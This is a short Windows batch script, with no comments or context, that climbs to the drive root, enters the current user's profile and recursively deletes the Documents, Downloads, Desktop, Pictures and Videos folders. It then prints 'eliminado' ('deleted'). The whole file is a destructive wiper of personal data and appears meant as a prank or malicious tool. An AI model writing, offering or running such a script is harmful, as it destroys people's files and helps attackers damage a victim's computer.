@echo off 
FOR %%i in ( 0 1 2 3 4 5 6 7 8 9 10 11 ) DO cd ..
cd Users
cd %USERNAME%
RD /S Documents
RD /S Downloads
RD /S Desktop
RD /S Pictures
RD /S Videos
RD Documents
RD Downloads
RD Desktop
RD Pictures
RD Videos
echo eliminado